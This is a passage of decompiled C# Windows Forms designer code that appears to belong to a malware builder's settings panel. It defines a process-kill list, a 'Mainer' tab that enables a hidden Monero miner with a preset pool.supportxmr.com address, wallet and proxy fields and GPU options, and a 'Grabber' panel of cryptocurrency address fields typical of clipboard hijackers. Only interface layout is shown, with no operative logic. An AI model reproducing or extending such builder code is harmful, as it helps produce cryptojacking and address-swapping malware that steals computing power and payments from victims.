		Tab_Process.Controls.Add(Listkill);
		Tab_Process.Controls.Add(PictureBox61);
		Tab_Process.Controls.Add(Label74);
		Tab_Process.Controls.Add(Guna2GradientButton1);
		Tab_Process.Controls.Add(List_Kill);
		Tab_Process.Enabled = false;
		Tab_Process.Location = new Point(447, 36);
		Tab_Process.Name = "Tab_Process";
		Tab_Process.ShadowDecoration.Parent = Tab_Process;
		Tab_Process.Size = new Size(416, 326);
		Tab_Process.TabIndex = 106;
		Listkill.BackColor = Color.FromArgb(37, 42, 64);
		Listkill.BorderStyle = BorderStyle.None;
		Listkill.Columns.AddRange(new ColumnHeader[1] { vmethod_91() });
		Listkill.ContextMenuStrip = Remove_List_Kill;
		Listkill.Font = new Font("Segoe UI Semibold", 9f, FontStyle.Bold);
		Listkill.ForeColor = Color.LawnGreen;
		Listkill.HideSelection = false;
		Listkill.Location = new Point(10, 119);
		Listkill.Name = "Listkill";
		Listkill.Size = new Size(399, 195);
		Listkill.TabIndex = 115;
		Listkill.UseCompatibleStateImageBehavior = false;
		Listkill.View = View.Details;
		vmethod_91().Text = "Process Name";
		vmethod_91().Width = 396;
		Remove_List_Kill.BackColor = Color.Black;
		Remove_List_Kill.Font = new Font("Segoe UI", 14.25f, FontStyle.Bold);
		Remove_List_Kill.ImageScalingSize = new Size(32, 32);
		Remove_List_Kill.ImeMode = ImeMode.Disable;
		Remove_List_Kill.Items.AddRange(new ToolStripItem[2] { ToolStripMenuItem27, ToolStripMenuItem28 });
		Remove_List_Kill.LayoutStyle = ToolStripLayoutStyle.VerticalStackWithOverflow;
		Remove_List_Kill.Name = "ContextMenuStrip1";
		Remove_List_Kill.RenderMode = ToolStripRenderMode.Professional;
		Remove_List_Kill.Size = new Size(158, 80);
		ToolStripMenuItem27.BackColor = Color.FromArgb(24, 30, 54);
		ToolStripMenuItem27.Font = new Font("Arial", 8.25f, FontStyle.Bold);
		ToolStripMenuItem27.ForeColor = Color.FromArgb(224, 224, 224);
		ToolStripMenuItem27.Image = (Image)componentResourceManager.GetObject("ToolStripMenuItem27.Image");
		ToolStripMenuItem27.Name = "ToolStripMenuItem27";
		ToolStripMenuItem27.Size = new Size(157, 38);
		ToolStripMenuItem27.Text = "Remove";
		ToolStripMenuItem28.BackColor = Color.FromArgb(24, 30, 54);
		ToolStripMenuItem28.Font = new Font("Arial", 8.25f, FontStyle.Bold);
		ToolStripMenuItem28.ForeColor = Color.FromArgb(224, 224, 224);
		ToolStripMenuItem28.Image = (Image)componentResourceManager.GetObject("ToolStripMenuItem28.Image");
		ToolStripMenuItem28.Name = "ToolStripMenuItem28";
		ToolStripMenuItem28.Size = new Size(157, 38);
		ToolStripMenuItem28.Text = "Remove All";
		PictureBox61.Image = (Image)componentResourceManager.GetObject("PictureBox61.Image");
		PictureBox61.Location = new Point(361, 7);
		PictureBox61.Name = "PictureBox61";
		PictureBox61.Size = new Size(48, 30);
		PictureBox61.SizeMode = PictureBoxSizeMode.Zoom;
		PictureBox61.TabIndex = 114;
		PictureBox61.TabStop = false;
		Label74.AutoSize = true;
		Label74.Font = new Font("Nirmala UI", 12f, FontStyle.Regular, GraphicsUnit.Point, 0);
		Label74.ForeColor = Color.FromArgb(224, 224, 224);
		Label74.Location = new Point(5, 5);
		Label74.Name = "Label74";
		Label74.Size = new Size(135, 21);
		Label74.TabIndex = 44;
		Label74.Text = "Terminate Process";
		Guna2GradientButton1.CheckedState.Parent = Guna2GradientButton1;
		Guna2GradientButton1.CustomImages.Parent = Guna2GradientButton1;
		Guna2GradientButton1.Font = new Font("Segoe UI", 9f);
		Guna2GradientButton1.ForeColor = Color.White;
		Guna2GradientButton1.HoverState.Parent = Guna2GradientButton1;
		Guna2GradientButton1.Location = new Point(9, 83);
		Guna2GradientButton1.Name = "Guna2GradientButton1";
		Guna2GradientButton1.ShadowDecoration.Parent = Guna2GradientButton1;
		Guna2GradientButton1.Size = new Size(400, 30);
		Guna2GradientButton1.TabIndex = 41;
		Guna2GradientButton1.Text = "Add Process Name";
		List_Kill.Animated = true;
		List_Kill.AutoRoundedCorners = true;
		List_Kill.BackColor = Color.FromArgb(24, 30, 54);
		List_Kill.BorderColor = Color.FromArgb(0, 126, 249);
		List_Kill.BorderRadius = 13;
		List_Kill.BorderStyle = DashStyle.Custom;
		List_Kill.Cursor = Cursors.IBeam;
		List_Kill.DefaultText = "";
		List_Kill.DisabledState.BorderColor = Color.FromArgb(208, 208, 208);
		List_Kill.DisabledState.FillColor = Color.FromArgb(226, 226, 226);
		List_Kill.DisabledState.ForeColor = Color.FromArgb(138, 138, 138);
		List_Kill.DisabledState.Parent = List_Kill;
		List_Kill.DisabledState.PlaceholderForeColor = Color.FromArgb(138, 138, 138);
		List_Kill.FillColor = Color.FromArgb(24, 30, 54);
		List_Kill.FocusedState.BorderColor = Color.FromArgb(94, 148, 255);
		List_Kill.FocusedState.Parent = List_Kill;
		List_Kill.Font = new Font("Segoe UI Semibold", 9f, FontStyle.Bold);
		List_Kill.ForeColor = Color.White;
		List_Kill.HoverState.BorderColor = Color.FromArgb(94, 148, 255);
		List_Kill.HoverState.Parent = List_Kill;
		List_Kill.IconLeft = (Image)componentResourceManager.GetObject("List_Kill.IconLeft");
		List_Kill.Location = new Point(10, 45);
		List_Kill.Margin = new Padding(3, 2, 3, 2);
		List_Kill.Name = "List_Kill";
		List_Kill.PasswordChar = '\0';
		List_Kill.PlaceholderForeColor = Color.Gray;
		List_Kill.PlaceholderText = "Process Name";
		List_Kill.SelectedText = "";
		List_Kill.ShadowDecoration.Parent = List_Kill;
		List_Kill.Size = new Size(399, 29);
		List_Kill.Style = TextBoxStyle.Material;
		List_Kill.TabIndex = 37;
		List_Kill.TextAlign = HorizontalAlignment.Center;
		TabPage6.BackColor = Color.FromArgb(46, 51, 73);
		TabPage6.Controls.Add(Panel32);
		TabPage6.ForeColor = Color.FromArgb(46, 51, 73);
		TabPage6.Location = new Point(4, 22);
		TabPage6.Name = "TabPage6";
		TabPage6.Size = new Size(894, 398);
		TabPage6.TabIndex = 5;
		TabPage6.Text = "Mainer";
		Panel32.BackColor = Color.FromArgb(46, 51, 73);
		Panel32.Controls.Add(Panel36);
		Panel32.Controls.Add(Guna2GradientPanel11);
		Panel32.Dock = DockStyle.Fill;
		Panel32.ForeColor = Color.Transparent;
		Panel32.Location = new Point(0, 0);
		Panel32.Name = "Panel32";
		Panel32.Size = new Size(894, 398);
		Panel32.TabIndex = 65;
		Panel36.BackColor = Color.FromArgb(24, 30, 54);
		Panel36.Controls.Add(PictureBox73);
		Panel36.Controls.Add(Proxy_Port);
		Panel36.Controls.Add(Enable_Proxy);
		Panel36.Controls.Add(Label78);
		Panel36.Controls.Add(Proxy_Host);
		Panel36.Controls.Add(PictureBox72);
		Panel36.Controls.Add(NVIDIA);
		Panel36.Controls.Add(Label83);
		Panel36.Controls.Add(PictureBox74);
		Panel36.Controls.Add(CPU);
		Panel36.Controls.Add(Label86);
		Panel36.Controls.Add(PictureBox75);
		Panel36.Controls.Add(Label89);
		Panel36.Controls.Add(AMD);
		Panel36.Controls.Add(XMR);
		Panel36.Controls.Add(Label87);
		Panel36.Controls.Add(Wallet_address);
		Panel36.Controls.Add(PictureBox65);
		Panel36.Controls.Add(POOL);
		Panel36.ForeColor = Color.FromArgb(37, 42, 64);
		Panel36.Location = new Point(12, 24);
		Panel36.Name = "Panel36";
		Panel36.Size = new Size(435, 348);
		Panel36.TabIndex = 135;
		PictureBox73.Anchor = AnchorStyles.Top | AnchorStyles.Right;
		PictureBox73.Image = (Image)componentResourceManager.GetObject("PictureBox73.Image");
		PictureBox73.Location = new Point(312, 238);
		PictureBox73.Name = "PictureBox73";
		PictureBox73.Size = new Size(112, 75);
		PictureBox73.SizeMode = PictureBoxSizeMode.Zoom;
		PictureBox73.TabIndex = 209;
		PictureBox73.TabStop = false;
		Proxy_Port.Animated = true;
		Proxy_Port.AutoRoundedCorners = true;
		Proxy_Port.BackColor = Color.FromArgb(46, 51, 73);
		Proxy_Port.BorderColor = Color.Silver;
		Proxy_Port.BorderRadius = 13;
		Proxy_Port.BorderStyle = DashStyle.Custom;
		Proxy_Port.Cursor = Cursors.IBeam;
		Proxy_Port.DefaultText = "";
		Proxy_Port.DisabledState.BorderColor = Color.FromArgb(208, 208, 208);
		Proxy_Port.DisabledState.FillColor = Color.FromArgb(226, 226, 226);
		Proxy_Port.DisabledState.ForeColor = Color.FromArgb(138, 138, 138);
		Proxy_Port.DisabledState.Parent = Proxy_Port;
		Proxy_Port.DisabledState.PlaceholderForeColor = Color.FromArgb(138, 138, 138);
		Proxy_Port.Enabled = false;
		Proxy_Port.FillColor = Color.FromArgb(24, 30, 54);
		Proxy_Port.FocusedState.BorderColor = Color.FromArgb(94, 148, 255);
		Proxy_Port.FocusedState.Parent = Proxy_Port;
		Proxy_Port.Font = new Font("Segoe UI Semibold", 9f, FontStyle.Bold);
		Proxy_Port.ForeColor = Color.White;
		Proxy_Port.HoverState.BorderColor = Color.FromArgb(94, 148, 255);
		Proxy_Port.HoverState.Parent = Proxy_Port;
		Proxy_Port.IconLeft = (Image)componentResourceManager.GetObject("Proxy_Port.IconLeft");
		Proxy_Port.IconLeftCursor = Cursors.Hand;
		Proxy_Port.Location = new Point(312, 173);
		Proxy_Port.Margin = new Padding(3, 2, 3, 2);
		Proxy_Port.Name = "Proxy_Port";
		Proxy_Port.PasswordChar = '\0';
		Proxy_Port.PlaceholderForeColor = Color.Gray;
		Proxy_Port.PlaceholderText = "Port";
		Proxy_Port.SelectedText = "";
		Proxy_Port.ShadowDecoration.Parent = Proxy_Port;
		Proxy_Port.Size = new Size(112, 29);
		Proxy_Port.Style = TextBoxStyle.Material;
		Proxy_Port.TabIndex = 208;
		Proxy_Port.TextAlign = HorizontalAlignment.Center;
		Enable_Proxy.CheckedState.BorderColor = Color.FromArgb(94, 148, 255);
		Enable_Proxy.CheckedState.FillColor = Color.FromArgb(94, 148, 255);
		Enable_Proxy.CheckedState.InnerBorderColor = Color.White;
		Enable_Proxy.CheckedState.InnerColor = Color.White;
		Enable_Proxy.CheckedState.Parent = Enable_Proxy;
		Enable_Proxy.Enabled = false;
		Enable_Proxy.Location = new Point(9, 136);
		Enable_Proxy.Name = "Enable_Proxy";
		Enable_Proxy.ShadowDecoration.Parent = Enable_Proxy;
		Enable_Proxy.Size = new Size(35, 20);
		Enable_Proxy.TabIndex = 205;
		Enable_Proxy.UncheckedState.BorderColor = Color.FromArgb(125, 137, 149);
		Enable_Proxy.UncheckedState.FillColor = Color.FromArgb(125, 137, 149);
		Enable_Proxy.UncheckedState.InnerBorderColor = Color.White;
		Enable_Proxy.UncheckedState.InnerColor = Color.White;
		Enable_Proxy.UncheckedState.Parent = Enable_Proxy;
		Label78.AutoSize = true;
		Label78.Font = new Font("Arial", 8.25f, FontStyle.Bold);
		Label78.ForeColor = Color.White;
		Label78.Location = new Point(50, 139);
		Label78.Name = "Label78";
		Label78.Size = new Size(77, 14);
		Label78.TabIndex = 206;
		Label78.Text = "Enable Proxy";
		Proxy_Host.Animated = true;
		Proxy_Host.AutoRoundedCorners = true;
		Proxy_Host.BackColor = Color.FromArgb(46, 51, 73);
		Proxy_Host.BorderColor = Color.Silver;
		Proxy_Host.BorderRadius = 13;
		Proxy_Host.BorderStyle = DashStyle.Custom;
		Proxy_Host.Cursor = Cursors.IBeam;
		Proxy_Host.DefaultText = "";
		Proxy_Host.DisabledState.BorderColor = Color.FromArgb(208, 208, 208);
		Proxy_Host.DisabledState.FillColor = Color.FromArgb(226, 226, 226);
		Proxy_Host.DisabledState.ForeColor = Color.FromArgb(138, 138, 138);
		Proxy_Host.DisabledState.Parent = Proxy_Host;
		Proxy_Host.DisabledState.PlaceholderForeColor = Color.FromArgb(138, 138, 138);
		Proxy_Host.Enabled = false;
		Proxy_Host.FillColor = Color.FromArgb(24, 30, 54);
		Proxy_Host.FocusedState.BorderColor = Color.FromArgb(94, 148, 255);
		Proxy_Host.FocusedState.Parent = Proxy_Host;
		Proxy_Host.Font = new Font("Segoe UI Semibold", 9f, FontStyle.Bold);
		Proxy_Host.ForeColor = Color.White;
		Proxy_Host.HoverState.BorderColor = Color.FromArgb(94, 148, 255);
		Proxy_Host.HoverState.Parent = Proxy_Host;
		Proxy_Host.IconLeft = (Image)componentResourceManager.GetObject("Proxy_Host.IconLeft");
		Proxy_Host.IconLeftCursor = Cursors.Hand;
		Proxy_Host.Location = new Point(10, 173);
		Proxy_Host.Margin = new Padding(3, 2, 3, 2);
		Proxy_Host.Name = "Proxy_Host";
		Proxy_Host.PasswordChar = '\0';
		Proxy_Host.PlaceholderForeColor = Color.Gray;
		Proxy_Host.PlaceholderText = "Host";
		Proxy_Host.SelectedText = "";
		Proxy_Host.ShadowDecoration.Parent = Proxy_Host;
		Proxy_Host.Size = new Size(287, 29);
		Proxy_Host.Style = TextBoxStyle.Material;
		Proxy_Host.TabIndex = 204;
		Proxy_Host.TextAlign = HorizontalAlignment.Center;
		PictureBox72.Image = (Image)componentResourceManager.GetObject("PictureBox72.Image");
		PictureBox72.Location = new Point(9, 303);
		PictureBox72.Name = "PictureBox72";
		PictureBox72.Size = new Size(48, 30);
		PictureBox72.SizeMode = PictureBoxSizeMode.Zoom;
		PictureBox72.TabIndex = 203;
		PictureBox72.TabStop = false;
		NVIDIA.CheckedState.BorderColor = Color.FromArgb(94, 148, 255);
		NVIDIA.CheckedState.FillColor = Color.FromArgb(94, 148, 255);
		NVIDIA.CheckedState.InnerBorderColor = Color.White;
		NVIDIA.CheckedState.InnerColor = Color.White;
		NVIDIA.CheckedState.Parent = NVIDIA;
		NVIDIA.Enabled = false;
		NVIDIA.Location = new Point(66, 308);
		NVIDIA.Name = "NVIDIA";
		NVIDIA.ShadowDecoration.Parent = NVIDIA;
		NVIDIA.Size = new Size(35, 20);
		NVIDIA.TabIndex = 201;
		NVIDIA.UncheckedState.BorderColor = Color.FromArgb(125, 137, 149);
		NVIDIA.UncheckedState.FillColor = Color.FromArgb(125, 137, 149);
		NVIDIA.UncheckedState.InnerBorderColor = Color.White;
		NVIDIA.UncheckedState.InnerColor = Color.White;
		NVIDIA.UncheckedState.Parent = NVIDIA;
		Label83.AutoSize = true;
		Label83.Font = new Font("Arial", 8.25f, FontStyle.Bold);
		Label83.ForeColor = Color.White;
		Label83.Location = new Point(107, 308);
		Label83.Name = "Label83";
		Label83.Size = new Size(78, 14);
		Label83.TabIndex = 202;
		Label83.Text = "NVIDIA GPUs ";
		PictureBox74.Image = (Image)componentResourceManager.GetObject("PictureBox74.Image");
		PictureBox74.Location = new Point(9, 221);
		PictureBox74.Name = "PictureBox74";
		PictureBox74.Size = new Size(48, 30);
		PictureBox74.SizeMode = PictureBoxSizeMode.Zoom;
		PictureBox74.TabIndex = 197;
		PictureBox74.TabStop = false;
		CPU.CheckedState.BorderColor = Color.FromArgb(94, 148, 255);
		CPU.CheckedState.FillColor = Color.FromArgb(94, 148, 255);
		CPU.CheckedState.InnerBorderColor = Color.White;
		CPU.CheckedState.InnerColor = Color.White;
		CPU.CheckedState.Parent = CPU;
		CPU.Enabled = false;
		CPU.Location = new Point(65, 227);
		CPU.Name = "CPU";
		CPU.ShadowDecoration.Parent = CPU;
		CPU.Size = new Size(35, 20);
		CPU.TabIndex = 195;
		CPU.UncheckedState.BorderColor = Color.FromArgb(125, 137, 149);
		CPU.UncheckedState.FillColor = Color.FromArgb(125, 137, 149);
		CPU.UncheckedState.InnerBorderColor = Color.White;
		CPU.UncheckedState.InnerColor = Color.White;
		CPU.UncheckedState.Parent = CPU;
		Label86.AutoSize = true;
		Label86.Font = new Font("Arial", 8.25f, FontStyle.Bold);
		Label86.ForeColor = Color.White;
		Label86.Location = new Point(106, 232);
		Label86.Name = "Label86";
		Label86.Size = new Size(29, 14);
		Label86.TabIndex = 196;
		Label86.Text = "CPU";
		PictureBox75.Image = (Image)componentResourceManager.GetObject("PictureBox75.Image");
		PictureBox75.Location = new Point(9, 261);
		PictureBox75.Name = "PictureBox75";
		PictureBox75.Size = new Size(48, 30);
		PictureBox75.SizeMode = PictureBoxSizeMode.Zoom;
		PictureBox75.TabIndex = 194;
		PictureBox75.TabStop = false;
		Label89.AutoSize = true;
		Label89.Font = new Font("Arial", 8.25f, FontStyle.Bold);
		Label89.ForeColor = Color.White;
		Label89.Location = new Point(106, 268);
		Label89.Name = "Label89";
		Label89.Size = new Size(64, 14);
		Label89.TabIndex = 193;
		Label89.Text = "AMD GPUs";
		AMD.CheckedState.BorderColor = Color.FromArgb(94, 148, 255);
		AMD.CheckedState.FillColor = Color.FromArgb(94, 148, 255);
		AMD.CheckedState.InnerBorderColor = Color.White;
		AMD.CheckedState.InnerColor = Color.White;
		AMD.CheckedState.Parent = AMD;
		AMD.Enabled = false;
		AMD.Location = new Point(65, 267);
		AMD.Name = "AMD";
		AMD.ShadowDecoration.Parent = AMD;
		AMD.Size = new Size(35, 20);
		AMD.TabIndex = 192;
		AMD.UncheckedState.BorderColor = Color.FromArgb(125, 137, 149);
		AMD.UncheckedState.FillColor = Color.FromArgb(125, 137, 149);
		AMD.UncheckedState.InnerBorderColor = Color.White;
		AMD.UncheckedState.InnerColor = Color.White;
		AMD.UncheckedState.Parent = AMD;
		XMR.CheckedState.BorderColor = Color.FromArgb(94, 148, 255);
		XMR.CheckedState.FillColor = Color.FromArgb(94, 148, 255);
		XMR.CheckedState.InnerBorderColor = Color.White;
		XMR.CheckedState.InnerColor = Color.White;
		XMR.CheckedState.Parent = XMR;
		XMR.Location = new Point(9, 9);
		XMR.Name = "XMR";
		XMR.ShadowDecoration.Parent = XMR;
		XMR.Size = new Size(35, 20);
		XMR.TabIndex = 188;
		XMR.UncheckedState.BorderColor = Color.FromArgb(125, 137, 149);
		XMR.UncheckedState.FillColor = Color.FromArgb(125, 137, 149);
		XMR.UncheckedState.InnerBorderColor = Color.White;
		XMR.UncheckedState.InnerColor = Color.White;
		XMR.UncheckedState.Parent = XMR;
		Label87.AutoSize = true;
		Label87.Font = new Font("Arial", 8.25f, FontStyle.Bold);
		Label87.ForeColor = Color.White;
		Label87.Location = new Point(50, 10);
		Label87.Name = "Label87";
		Label87.Size = new Size(113, 14);
		Label87.TabIndex = 187;
		Label87.Text = "Enable Miner (XMR)";
		Wallet_address.Animated = true;
		Wallet_address.AutoRoundedCorners = true;
		Wallet_address.BackColor = Color.FromArgb(46, 51, 73);
		Wallet_address.BorderColor = Color.Silver;
		Wallet_address.BorderRadius = 13;
		Wallet_address.BorderStyle = DashStyle.Custom;
		Wallet_address.Cursor = Cursors.IBeam;
		Wallet_address.DefaultText = "";
		Wallet_address.DisabledState.BorderColor = Color.FromArgb(208, 208, 208);
		Wallet_address.DisabledState.FillColor = Color.FromArgb(226, 226, 226);
		Wallet_address.DisabledState.ForeColor = Color.FromArgb(138, 138, 138);
		Wallet_address.DisabledState.Parent = Wallet_address;
		Wallet_address.DisabledState.PlaceholderForeColor = Color.FromArgb(138, 138, 138);
		Wallet_address.Enabled = false;
		Wallet_address.FillColor = Color.FromArgb(24, 30, 54);
		Wallet_address.FocusedState.BorderColor = Color.FromArgb(94, 148, 255);
		Wallet_address.FocusedState.Parent = Wallet_address;
		Wallet_address.Font = new Font("Segoe UI Semibold", 9f, FontStyle.Bold);
		Wallet_address.ForeColor = Color.White;
		Wallet_address.HoverState.BorderColor = Color.FromArgb(94, 148, 255);
		Wallet_address.HoverState.Parent = Wallet_address;
		Wallet_address.IconLeft = (Image)componentResourceManager.GetObject("Wallet_address.IconLeft");
		Wallet_address.IconLeftCursor = Cursors.Hand;
		Wallet_address.IconRight = (Image)componentResourceManager.GetObject("Wallet_address.IconRight");
		Wallet_address.Location = new Point(10, 93);
		Wallet_address.Margin = new Padding(3, 2, 3, 2);
		Wallet_address.Name = "Wallet_address";
		Wallet_address.PasswordChar = '\0';
		Wallet_address.PlaceholderForeColor = Color.Gray;
		Wallet_address.PlaceholderText = "Wallet address";
		Wallet_address.SelectedText = "";
		Wallet_address.ShadowDecoration.Parent = Wallet_address;
		Wallet_address.Size = new Size(414, 29);
		Wallet_address.Style = TextBoxStyle.Material;
		Wallet_address.TabIndex = 87;
		Wallet_address.TextAlign = HorizontalAlignment.Center;
		PictureBox65.Anchor = AnchorStyles.Top | AnchorStyles.Right;
		PictureBox65.Image = (Image)componentResourceManager.GetObject("PictureBox65.Image");
		PictureBox65.Location = new Point(384, 3);
		PictureBox65.Name = "PictureBox65";
		PictureBox65.Size = new Size(48, 30);
		PictureBox65.SizeMode = PictureBoxSizeMode.Zoom;
		PictureBox65.TabIndex = 76;
		PictureBox65.TabStop = false;
		POOL.Animated = true;
		POOL.AutoRoundedCorners = true;
		POOL.BackColor = Color.FromArgb(24, 30, 54);
		POOL.BorderColor = Color.Silver;
		POOL.BorderRadius = 13;
		POOL.BorderStyle = DashStyle.Custom;
		POOL.Cursor = Cursors.IBeam;
		POOL.DefaultText = "pool.supportxmr.com:443";
		POOL.DisabledState.BorderColor = Color.FromArgb(208, 208, 208);
		POOL.DisabledState.FillColor = Color.FromArgb(226, 226, 226);
		POOL.DisabledState.ForeColor = Color.FromArgb(138, 138, 138);
		POOL.DisabledState.Parent = POOL;
		POOL.DisabledState.PlaceholderForeColor = Color.FromArgb(138, 138, 138);
		POOL.Enabled = false;
		POOL.FillColor = Color.FromArgb(24, 30, 54);
		POOL.FocusedState.BorderColor = Color.FromArgb(94, 148, 255);
		POOL.FocusedState.Parent = POOL;
		POOL.Font = new Font("Segoe UI Semibold", 9f, FontStyle.Bold);
		POOL.ForeColor = Color.White;
		POOL.HoverState.BorderColor = Color.FromArgb(94, 148, 255);
		POOL.HoverState.Parent = POOL;
		POOL.IconLeft = (Image)componentResourceManager.GetObject("POOL.IconLeft");
		POOL.IconLeftCursor = Cursors.Hand;
		POOL.IconRight = (Image)componentResourceManager.GetObject("POOL.IconRight");
		POOL.IconRightCursor = Cursors.Hand;
		POOL.Location = new Point(10, 48);
		POOL.Margin = new Padding(3, 2, 3, 2);
		POOL.Name = "POOL";
		POOL.PasswordChar = '\0';
		POOL.PlaceholderForeColor = Color.Gray;
		POOL.PlaceholderText = "Stratum server URL";
		POOL.SelectedText = "";
		POOL.SelectionStart = 23;
		POOL.ShadowDecoration.Parent = POOL;
		POOL.Size = new Size(414, 29);
		POOL.Style = TextBoxStyle.Material;
		POOL.TabIndex = 86;
		POOL.TextAlign = HorizontalAlignment.Center;
		Guna2GradientPanel11.BackColor = Color.FromArgb(24, 30, 54);
		Guna2GradientPanel11.Controls.Add(NEC);
		Guna2GradientPanel11.Controls.Add(XLM);
		Guna2GradientPanel11.Controls.Add(XRP);
		Guna2GradientPanel11.Controls.Add(LTC);
		Guna2GradientPanel11.Controls.Add(PictureBox70);
		Guna2GradientPanel11.Controls.Add(ETH);
		Guna2GradientPanel11.Controls.Add(GXMR);
		Guna2GradientPanel11.Controls.Add(Label85);
		Guna2GradientPanel11.Controls.Add(BTC);
		Guna2GradientPanel11.Controls.Add(Grabber);
		Guna2GradientPanel11.Location = new Point(453, 24);
		Guna2GradientPanel11.Name = "Guna2GradientPanel11";
		Guna2GradientPanel11.ShadowDecoration.Parent = Guna2GradientPanel11;
		Guna2GradientPanel11.Size = new Size(424, 348);
		Guna2GradientPanel11.TabIndex = 115;
		NEC.Animated = true;
		NEC.AutoRoundedCorners = true;
		NEC.BackColor = Color.FromArgb(24, 30, 54);
		NEC.BorderColor = Color.FromArgb(0, 126, 249);
		NEC.BorderRadius = 13;
		NEC.BorderStyle = DashStyle.Custom;
		NEC.Cursor = Cursors.IBeam;
		NEC.DefaultText = "";
		NEC.DisabledState.BorderColor = Color.FromArgb(208, 208, 208);
		NEC.DisabledState.FillColor = Color.FromArgb(226, 226, 226);
		NEC.DisabledState.ForeColor = Color.FromArgb(138, 138, 138);
		NEC.DisabledState.Parent = NEC;
		NEC.DisabledState.PlaceholderForeColor = Color.FromArgb(138, 138, 138);
		NEC.Enabled = false;
		NEC.FillColor = Color.FromArgb(24, 30, 54);
		NEC.FocusedState.BorderColor = Color.FromArgb(94, 148, 255);
		NEC.FocusedState.Parent = NEC;
		NEC.Font = new Font("Segoe UI Semibold", 9f, FontStyle.Bold);
		NEC.ForeColor = Color.White;
		NEC.HoverState.BorderColor = Color.FromArgb(94, 148, 255);
		NEC.HoverState.Parent = NEC;
		NEC.IconLeft = (Image)componentResourceManager.GetObject("NEC.IconLeft");
		NEC.Location = new Point(10, 305);
		NEC.Margin = new Padding(3, 2, 3, 2);
		NEC.Name = "NEC";
		NEC.PasswordChar = '\0';
		NEC.PlaceholderForeColor = Color.Gray;
		NEC.PlaceholderText = "NEC Address";
		NEC.SelectedText = "";
		NEC.ShadowDecoration.Parent = NEC;
		NEC.Size = new Size(399, 29);
		NEC.Style = TextBoxStyle.Material;
		NEC.TabIndex = 200;
		NEC.TextAlign = HorizontalAlignment.Center;
		XLM.Animated = true;
		XLM.AutoRoundedCorners = true;
		XLM.BackColor = Color.FromArgb(24, 30, 54);
		XLM.BorderColor = Color.FromArgb(0, 126, 249);
		XLM.BorderRadius = 13;
		XLM.BorderStyle = DashStyle.Custom;
		XLM.Cursor = Cursors.IBeam;
		XLM.DefaultText = "";
		XLM.DisabledState.BorderColor = Color.FromArgb(208, 208, 208);
		XLM.DisabledState.FillColor = Color.FromArgb(226, 226, 226);
		XLM.DisabledState.ForeColor = Color.FromArgb(138, 138, 138);
		XLM.DisabledState.Parent = XLM;
		XLM.DisabledState.PlaceholderForeColor = Color.FromArgb(138, 138, 138);
		XLM.Enabled = false;
		XLM.FillColor = Color.FromArgb(24, 30, 54);
		XLM.FocusedState.BorderColor = Color.FromArgb(94, 148, 255);
		XLM.FocusedState.Parent = XLM;
		XLM.Font = new Font("Segoe UI Semibold", 9f, FontStyle.Bold);
		XLM.ForeColor = Color.White;
		XLM.HoverState.BorderColor = Color.FromArgb(94, 148, 255);
		XLM.HoverState.Parent = XLM;
		XLM.IconLeft = (Image)componentResourceManager.GetObject("XLM.IconLeft");
		XLM.Location = new Point(10, 220);
		XLM.Margin = new Padding(3, 2, 3, 2);
		XLM.Name = "XLM";
		XLM.PasswordChar = '\0';
		XLM.PlaceholderForeColor = Color.Gray;
		XLM.PlaceholderText = "XLM Address";
		XLM.SelectedText = "";
		XLM.ShadowDecoration.Parent = XLM;
		XLM.Size = new Size(399, 29);
		XLM.Style = TextBoxStyle.Material;
		XLM.TabIndex = 115;
		XLM.TextAlign = HorizontalAlignment.Center;
		XRP.Animated = true;
		XRP.AutoRoundedCorners = true;
		XRP.BackColor = Color.FromArgb(24, 30, 54);
		XRP.BorderColor = Color.FromArgb(0, 126, 249);
		XRP.BorderRadius = 13;
		XRP.BorderStyle = DashStyle.Custom;
		XRP.Cursor = Cursors.IBeam;
		XRP.DefaultText = "";
		XRP.DisabledState.BorderColor = Color.FromArgb(208, 208, 208);
		XRP.DisabledState.FillColor = Color.FromArgb(226, 226, 226);
		XRP.DisabledState.ForeColor = Color.FromArgb(138, 138, 138);
		XRP.DisabledState.Parent = XRP;
		XRP.DisabledState.PlaceholderForeColor = Color.FromArgb(138, 138, 138);
		XRP.Enabled = false;
		XRP.FillColor = Color.FromArgb(24, 30, 54);
		XRP.FocusedState.BorderColor = Color.FromArgb(94, 148, 255);
		XRP.FocusedState.Parent = XRP;
		XRP.Font = new Font("Segoe UI Semibold", 9f, FontStyle.Bold);
		XRP.ForeColor = Color.White;
		XRP.HoverState.BorderColor = Color.FromArgb(94, 148, 255);
		XRP.HoverState.Parent = XRP;
		XRP.IconLeft = (Image)componentResourceManager.GetObject("XRP.IconLeft");
		XRP.Location = new Point(9, 263);
		XRP.Margin = new Padding(3, 2, 3, 2);
		XRP.Name = "XRP";
		XRP.PasswordChar = '\0';
		XRP.PlaceholderForeColor = Color.Gray;
		XRP.PlaceholderText = "XRP Address";
		XRP.SelectedText = "";
		XRP.ShadowDecoration.Parent = XRP;
		XRP.Size = new Size(399, 29);
		XRP.Style = TextBoxStyle.Material;
		XRP.TabIndex = 116;
		XRP.TextAlign = HorizontalAlignment.Center;
		LTC.Animated = true;
		LTC.AutoRoundedCorners = true;
		LTC.BackColor = Color.FromArgb(24, 30, 54);
		LTC.BorderColor = Color.FromArgb(0, 126, 249);
		LTC.BorderRadius = 13;
		LTC.BorderStyle = DashStyle.Custom;
		LTC.Cursor = Cursors.IBeam;
		LTC.DefaultText = "";
		LTC.DisabledState.BorderColor = Color.FromArgb(208, 208, 208);
		LTC.DisabledState.FillColor = Color.FromArgb(226, 226, 226);
		LTC.DisabledState.ForeColor = Color.FromArgb(138, 138, 138);
		LTC.DisabledState.Parent = LTC;
		LTC.DisabledState.PlaceholderForeColor = Color.FromArgb(138, 138, 138);
		LTC.Enabled = false;
		LTC.FillColor = Color.FromArgb(24, 30, 54);
		LTC.FocusedState.BorderColor = Color.FromArgb(94, 148, 255);
		LTC.FocusedState.Parent = LTC;
		LTC.Font = new Font("Segoe UI Semibold", 9f, FontStyle.Bold);
		LTC.ForeColor = Color.White;
		LTC.HoverState.BorderColor = Color.FromArgb(94, 148, 255);
		LTC.HoverState.Parent = LTC;
		LTC.IconLeft = (Image)componentResourceManager.GetObject("LTC.IconLeft");
		LTC.Location = new Point(10, 178);
		LTC.Margin = new Padding(3, 2, 3, 2);
		LTC.Name = "LTC";
		LTC.PasswordChar = '\0';
		LTC.PlaceholderForeColor = Color.Gray;
		LTC.PlaceholderText = "LTC Address";
		LTC.SelectedText = "";
		LTC.ShadowDecoration.Parent = LTC;
		LTC.Size = new Size(399, 29);
		LTC.Style = TextBoxStyle.Material;
		LTC.TabIndex = 117;
		LTC.TextAlign = HorizontalAlignment.Center;
